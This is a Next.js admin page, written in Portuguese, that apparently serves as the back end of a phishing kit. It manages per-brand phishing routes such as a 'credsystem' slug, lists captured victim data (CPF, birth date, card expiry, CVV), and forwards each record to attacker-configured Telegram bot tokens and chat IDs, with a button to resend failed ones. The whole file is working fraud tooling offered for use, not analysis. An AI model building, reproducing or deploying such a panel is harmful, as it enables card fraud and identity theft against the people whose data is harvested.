"use client"

import { useState, useEffect } from "react"
import { useRouter } from "next/navigation"

interface RouteConfig {
  id: string
  slug: string
  name: string
  telegramToken: string
  telegramChatId: string
  isActive: boolean
  createdAt: string
  _count: { submissions: number }
}

interface Submission {
  id: string
  routeSlug: string
  cpf: string
  birthDate: string | null
  cardExpiry: string | null
  cvv: string | null
  sentToTelegram: boolean
  telegramError: string | null
  createdAt: string
  routeConfig: { name: string; slug: string }
}

export default function AdminPage() {
  const router = useRouter()
  const [isAuthenticated, setIsAuthenticated] = useState<boolean | null>(null)
  const [activeTab, setActiveTab] = useState<"routes" | "submissions">("routes")
  const [routes, setRoutes] = useState<RouteConfig[]>([])
  const [submissions, setSubmissions] = useState<Submission[]>([])
  const [selectedRoute, setSelectedRoute] = useState<string>("")
  const [loading, setLoading] = useState(true)
  
  // Form states
  const [showForm, setShowForm] = useState(false)
  const [editingRoute, setEditingRoute] = useState<RouteConfig | null>(null)
  const [formData, setFormData] = useState({
    slug: "",
    name: "",
    telegramToken: "",
    telegramChatId: "",
  })

  // Login states
  const [username, setUsername] = useState("")
  const [password, setPassword] = useState("")
  const [loginError, setLoginError] = useState("")

  // Check authentication
  useEffect(() => {
    checkAuth()
  }, [])

  const checkAuth = async () => {
    try {
      const res = await fetch("/api/auth/check")
      const data = await res.json()
      setIsAuthenticated(data.authenticated)
      if (data.authenticated) {
        loadData()
      }
    } catch {
      setIsAuthenticated(false)
    } finally {
      setLoading(false)
    }
  }

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault()
    setLoginError("")
    
    try {
      const res = await fetch("/api/auth/login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ username, password }),
      })
      
      if (res.ok) {
        setIsAuthenticated(true)
        loadData()
      } else {
        const data = await res.json()
        setLoginError(data.error || "Erro ao fazer login")
      }
    } catch {
      setLoginError("Erro de conexão")
    }
  }

  const handleLogout = async () => {
    await fetch("/api/auth/logout", { method: "POST" })
    setIsAuthenticated(false)
  }

  const loadData = async () => {
    try {
      const [routesRes, submissionsRes] = await Promise.all([
        fetch("/api/routes"),
        fetch("/api/submissions"),
      ])
      
      if (routesRes.ok) {
        setRoutes(await routesRes.json())
      }
      if (submissionsRes.ok) {
        setSubmissions(await submissionsRes.json())
      }
    } catch (error) {
      console.error("Erro ao carregar dados:", error)
    }
  }

  const handleSubmitRoute = async (e: React.FormEvent) => {
    e.preventDefault()
    
    try {
      const url = editingRoute ? `/api/routes/${editingRoute.id}` : "/api/routes"
      const method = editingRoute ? "PUT" : "POST"
      
      const res = await fetch(url, {
        method,
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(formData),
      })
      
      if (res.ok) {
        setShowForm(false)
        setEditingRoute(null)
        setFormData({ slug: "", name: "", telegramToken: "", telegramChatId: "" })
        loadData()
      }
    } catch (error) {
      console.error("Erro ao salvar rota:", error)
    }
  }

  const handleEditRoute = (route: RouteConfig) => {
    setEditingRoute(route)
    setFormData({
      slug: route.slug,
      name: route.name,
      telegramToken: route.telegramToken,
      telegramChatId: route.telegramChatId,
    })
    setShowForm(true)
  }

  const handleDeleteRoute = async (id: string) => {
    if (!confirm("Tem certeza que deseja excluir esta rota e todas as suas solicitações?")) return
    
    try {
      await fetch(`/api/routes/${id}`, { method: "DELETE" })
      loadData()
    } catch (error) {
      console.error("Erro ao excluir rota:", error)
    }
  }

  const handleToggleRoute = async (route: RouteConfig) => {
    try {
      await fetch(`/api/routes/${route.id}`, {
        method: "PUT",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ isActive: !route.isActive }),
      })
      loadData()
    } catch (error) {
      console.error("Erro ao atualizar rota:", error)
    }
  }

  const handleResendTelegram = async (id: string) => {
    try {
      const res = await fetch(`/api/submissions/${id}`, { method: "POST" })
      const data = await res.json()
      
      if (data.success) {
        alert("Reenviado com sucesso!")
      } else {
        alert(`Erro: ${data.error}`)
      }
      loadData()
    } catch (error) {
      console.error("Erro ao reenviar:", error)
    }
  }

  const filteredSubmissions = selectedRoute
    ? submissions.filter((s) => s.routeSlug === selectedRoute)
    : submissions

  // Loading state
  if (loading) {
    return (
      <div className="min-h-screen bg-gray-100 flex items-center justify-center">
        <div className="w-12 h-12 border-4 border-transparent border-t-blue-600 rounded-full animate-spin"></div>
      </div>
    )
  }

  // Login form
  if (!isAuthenticated) {
    return (
      <div className="min-h-screen bg-gray-100 flex items-center justify-center p-4">
        <div className="bg-white rounded-lg shadow-lg p-8 w-full max-w-md">
          <h1 className="text-2xl font-bold text-gray-800 mb-6 text-center">Painel Administrativo</h1>
          
          <form onSubmit={handleLogin} className="space-y-4">
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-1">Usuário</label>
              <input
                type="text"
                value={username}
                onChange={(e) => setUsername(e.target.value)}
                className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                required
              />
            </div>
            
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-1">Senha</label>
              <input
                type="password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                required
              />
            </div>
            
            {loginError && (
              <p className="text-red-500 text-sm">{loginError}</p>
            )}
            
            <button
              type="submit"
              className="w-full bg-blue-600 hover:bg-blue-700 text-white py-2 rounded-lg font-medium transition-colors"
            >
              Entrar
            </button>
          </form>
        </div>
      </div>
    )
  }

  // Admin panel
  return (
    <div className="min-h-screen bg-gray-100">
      {/* Header */}
      <header className="bg-white shadow">
        <div className="max-w-7xl mx-auto px-4 py-4 flex justify-between items-center">
          <h1 className="text-xl font-bold text-gray-800">Painel Administrativo</h1>
          <button
            onClick={handleLogout}
            className="text-gray-600 hover:text-gray-800 text-sm"
          >
            Sair
          </button>
        </div>
      </header>

      <main className="max-w-7xl mx-auto px-4 py-6">
        {/* Tabs */}
        <div className="flex space-x-4 mb-6">
          <button
            onClick={() => setActiveTab("routes")}
            className={`px-4 py-2 rounded-lg font-medium transition-colors ${
              activeTab === "routes"
                ? "bg-blue-600 text-white"
                : "bg-white text-gray-600 hover:bg-gray-50"
            }`}
          >
            Rotas
          </button>
          <button
            onClick={() => setActiveTab("submissions")}
            className={`px-4 py-2 rounded-lg font-medium transition-colors ${
              activeTab === "submissions"
                ? "bg-blue-600 text-white"
                : "bg-white text-gray-600 hover:bg-gray-50"
            }`}
          >
            Solicitações
          </button>
        </div>

        {/* Routes Tab */}
        {activeTab === "routes" && (
          <div className="space-y-4">
            <div className="flex justify-between items-center">
              <h2 className="text-lg font-semibold text-gray-800">Configuração de Rotas</h2>
              <button
                onClick={() => {
                  setEditingRoute(null)
                  setFormData({ slug: "", name: "", telegramToken: "", telegramChatId: "" })
                  setShowForm(true)
                }}
                className="bg-green-600 hover:bg-green-700 text-white px-4 py-2 rounded-lg text-sm font-medium"
              >
                + Nova Rota
              </button>
            </div>

            {/* Route Form Modal */}
            {showForm && (
              <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center p-4 z-50">
                <div className="bg-white rounded-lg p-6 w-full max-w-md">
                  <h3 className="text-lg font-semibold mb-4">
                    {editingRoute ? "Editar Rota" : "Nova Rota"}
                  </h3>
                  
                  <form onSubmit={handleSubmitRoute} className="space-y-4">
                    <div>
                      <label className="block text-sm font-medium text-gray-700 mb-1">
                        Slug (URL)
                      </label>
                      <input
                        type="text"
                        value={formData.slug}
                        onChange={(e) => setFormData({ ...formData, slug: e.target.value })}
                        placeholder="ex: credsystem ou cred-system"
                        className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500"
                        disabled={!!editingRoute}
                        required
                      />
                      <p className="text-xs text-gray-500 mt-1">
                        Será acessível em: /{formData.slug || "slug"}
                      </p>
                    </div>
                    
                    <div>
                      <label className="block text-sm font-medium text-gray-700 mb-1">
                        Nome Identificador
                      </label>
                      <input
                        type="text"
                        value={formData.name}
                        onChange={(e) => setFormData({ ...formData, name: e.target.value })}
                        placeholder="ex: CredSystem Principal"
                        className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500"
                        required
                      />
                    </div>
                    
                    <div>
                      <label className="block text-sm font-medium text-gray-700 mb-1">
                        Token do Bot Telegram
                      </label>
                      <input
                        type="text"
                        value={formData.telegramToken}
                        onChange={(e) => setFormData({ ...formData, telegramToken: e.target.value })}
                        placeholder="123456789:ABC..."
                        className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500"
                        required
                      />
                    </div>
                    
                    <div>
                      <label className="block text-sm font-medium text-gray-700 mb-1">
                        Chat ID
                      </label>
                      <input
                        type="text"
                        value={formData.telegramChatId}
                        onChange={(e) => setFormData({ ...formData, telegramChatId: e.target.value })}
                        placeholder="-1001234567890"
                        className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500"
                        required
                      />
                    </div>
                    
                    <div className="flex space-x-3 pt-2">
                      <button
                        type="button"
                        onClick={() => setShowForm(false)}
                        className="flex-1 bg-gray-200 hover:bg-gray-300 text-gray-800 py-2 rounded-lg font-medium"
                      >
                        Cancelar
                      </button>
                      <button
                        type="submit"
                        className="flex-1 bg-blue-600 hover:bg-blue-700 text-white py-2 rounded-lg font-medium"
                      >
                        Salvar
                      </button>
                    </div>
                  </form>
                </div>
              </div>
            )}

            {/* Routes List */}
            <div className="grid gap-4">
              {routes.length === 0 ? (
                <div className="bg-white rounded-lg p-8 text-center text-gray-500">
                  Nenhuma rota configurada. Clique em &quot;Nova Rota&quot; para começar.
                </div>
              ) : (
                routes.map((route) => (
                  <div key={route.id} className="bg-white rounded-lg shadow p-4">
                    <div className="flex justify-between items-start">
                      <div>
                        <div className="flex items-center space-x-2">
                          <h3 className="font-semibold text-gray-800">{route.name}</h3>
                          <span
                            className={`px-2 py-0.5 rounded text-xs font-medium ${
                              route.isActive
                                ? "bg-green-100 text-green-800"
                                : "bg-red-100 text-red-800"
                            }`}
                          >
                            {route.isActive ? "Ativa" : "Inativa"}
                          </span>
                        </div>
                        <p className="text-sm text-gray-500 mt-1">
                          URL: <code className="bg-gray-100 px-1 rounded">/{route.slug}</code>
                        </p>
                        <p className="text-sm text-gray-500">
                          Solicitações: {route._count.submissions}
                        </p>
                        <p className="text-xs text-gray-400 mt-1">
                          Chat ID: {route.telegramChatId}
                        </p>
                      </div>
                      
                      <div className="flex space-x-2">
                        <button
                          onClick={() => handleToggleRoute(route)}
                          className={`px-3 py-1 rounded text-sm ${
                            route.isActive
                              ? "bg-yellow-100 text-yellow-800 hover:bg-yellow-200"
                              : "bg-green-100 text-green-800 hover:bg-green-200"
                          }`}
                        >
                          {route.isActive ? "Desativar" : "Ativar"}
                        </button>
                        <button
                          onClick={() => handleEditRoute(route)}
                          className="px-3 py-1 bg-blue-100 text-blue-800 rounded text-sm hover:bg-blue-200"
                        >
                          Editar
                        </button>
                        <button
                          onClick={() => handleDeleteRoute(route.id)}
                          className="px-3 py-1 bg-red-100 text-red-800 rounded text-sm hover:bg-red-200"
                        >
                          Excluir
                        </button>
                      </div>
                    </div>
                  </div>
                ))
              )}
            </div>
          </div>
        )}

        {/* Submissions Tab */}
        {activeTab === "submissions" && (
          <div className="space-y-4">
            <div className="flex justify-between items-center">
              <h2 className="text-lg font-semibold text-gray-800">Solicitações Recebidas</h2>
              
              <select
                value={selectedRoute}
                onChange={(e) => setSelectedRoute(e.target.value)}
                className="px-4 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500"
              >
                <option value="">Todas as rotas</option>
                {routes.map((route) => (
                  <option key={route.id} value={route.slug}>
                    {route.name}
                  </option>
                ))}
              </select>
            </div>

            {/* Submissions List */}
            <div className="bg-white rounded-lg shadow overflow-hidden">
              {filteredSubmissions.length === 0 ? (
                <div className="p-8 text-center text-gray-500">
                  Nenhuma solicitação encontrada.
                </div>
              ) : (
                <div className="overflow-x-auto">
                  <table className="w-full">
                    <thead className="bg-gray-50">
                      <tr>
                        <th className="px-4 py-3 text-left text-xs font-medium text-gray-500 uppercase">
                          Data/Hora
                        </th>
                        <th className="px-4 py-3 text-left text-xs font-medium text-gray-500 uppercase">
                          Rota
                        </th>
                        <th className="px-4 py-3 text-left text-xs font-medium text-gray-500 uppercase">
                          CPF
                        </th>
                        <th className="px-4 py-3 text-left text-xs font-medium text-gray-500 uppercase">
                          Nascimento
                        </th>
                        <th className="px-4 py-3 text-left text-xs font-medium text-gray-500 uppercase">
                          Validade
                        </th>
                        <th className="px-4 py-3 text-left text-xs font-medium text-gray-500 uppercase">
                          CVV
                        </th>
                        <th className="px-4 py-3 text-left text-xs font-medium text-gray-500 uppercase">
                          Status
                        </th>
                        <th className="px-4 py-3 text-left text-xs font-medium text-gray-500 uppercase">
                          Ações
                        </th>
                      </tr>
                    </thead>
                    <tbody className="divide-y divide-gray-200">
                      {filteredSubmissions.map((sub) => (
                        <tr key={sub.id} className="hover:bg-gray-50">
                          <td className="px-4 py-3 text-sm text-gray-600">
                            {new Date(sub.createdAt).toLocaleString("pt-BR")}
                          </td>
                          <td className="px-4 py-3 text-sm">
                            <span className="bg-blue-100 text-blue-800 px-2 py-0.5 rounded text-xs">
                              {sub.routeConfig.name}
                            </span>
                          </td>
                          <td className="px-4 py-3 text-sm font-mono">{sub.cpf}</td>
                          <td className="px-4 py-3 text-sm">{sub.birthDate || "-"}</td>
                          <td className="px-4 py-3 text-sm">{sub.cardExpiry || "-"}</td>
                          <td className="px-4 py-3 text-sm font-mono">{sub.cvv || "-"}</td>
                          <td className="px-4 py-3 text-sm">
                            {sub.sentToTelegram ? (
                              <span className="bg-green-100 text-green-800 px-2 py-0.5 rounded text-xs">
                                Enviado
                              </span>
                            ) : (
                              <span className="bg-red-100 text-red-800 px-2 py-0.5 rounded text-xs" title={sub.telegramError || ""}>
                                Falhou
                              </span>
                            )}
                          </td>
                          <td className="px-4 py-3 text-sm">
                            {!sub.sentToTelegram && (
                              <button
                                onClick={() => handleResendTelegram(sub.id)}
                                className="text-blue-600 hover:text-blue-800 text-xs"
                              >
                                Reenviar
                              </button>
                            )}
                          </td>
                        </tr>
                      ))}
                    </tbody>
                  </table>
                </div>
              )}
            </div>
          </div>
        )}
      </main>
    </div>
  )
}
